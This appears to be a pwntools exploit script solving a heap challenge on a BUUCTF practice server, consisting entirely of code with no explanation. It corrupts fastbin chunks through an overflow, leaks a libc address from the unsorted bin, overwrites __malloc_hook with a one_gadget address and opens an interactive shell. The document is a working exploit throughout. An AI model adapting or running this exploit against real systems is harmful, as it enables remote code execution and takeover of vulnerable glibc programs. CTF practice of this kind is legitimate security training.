from pwn import *
#context.log_level="debug"

#sh=process("./timu")
#gdb.attach(sh)
sh=remote("node5.buuoj.cn",26266)
elf=process("./timu")

def alloc(size):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(1).encode())
	sh.recvuntil(b"Size: ")
	sh.sendline(str(size).encode())

def fill(index,size,content):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(2).encode())
	sh.recvuntil(b"Index: ")
	sh.sendline(str(index).encode())
	sh.recvuntil(b"Size: ")
	sh.sendline(str(size).encode())
	sh.recvuntil(b"Content: ")
	sh.sendline(content)

def free(index):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(3).encode())
	sh.recvuntil(b"Index: ")
	sh.sendline(str(index).encode())

def show(index):
	sh.recvuntil(b"Command: ")
	sh.sendline(str(4).encode())
	sh.recvuntil(b"Index: ")
	sh.sendline(str(index).encode())

alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4
alloc(0x10) #5
free(2) 
free(1)
payload=0x10*b'a'+p64(0)+p64(0x21)+b"\x80"
fill(0,len(payload),payload) #change chunk1's fd into chunk4's address
payload1=0x10*b'a'+p64(0)+p64(0x21)
fill(3,len(payload1),payload1) #change chunk4's size into 0x20
alloc(0x10) #1
alloc(0x10) #get chunk4  index:2
payload2=0x10*b'a'+p64(0)+p64(0x91)
fill(3,len(payload2),payload2) #change chunk4's size into 0x90
free(4) #put chunk4 into unsorted bin
show(2)
sh.recvuntil(b"Content: \n")
main_arena=u64(sh.recv(8))-88
print("main_arena=",hex(main_arena))
#gdb.attach(sh)
libc_base=main_arena-0x3C4B20
one_gadget=libc_base+0x4526a

alloc(0x60) #4 cut from chunk4:0x91
free(4)
fake_chunk_addr=p64(main_arena-0x33)
fill(2,len(fake_chunk_addr),fake_chunk_addr)
alloc(0x60) #4
alloc(0x60) #6
payload3=0x13*b'a'+p64(one_gadget)
fill(6,len(payload3),payload3)
alloc(0x100)

sh.interactive()
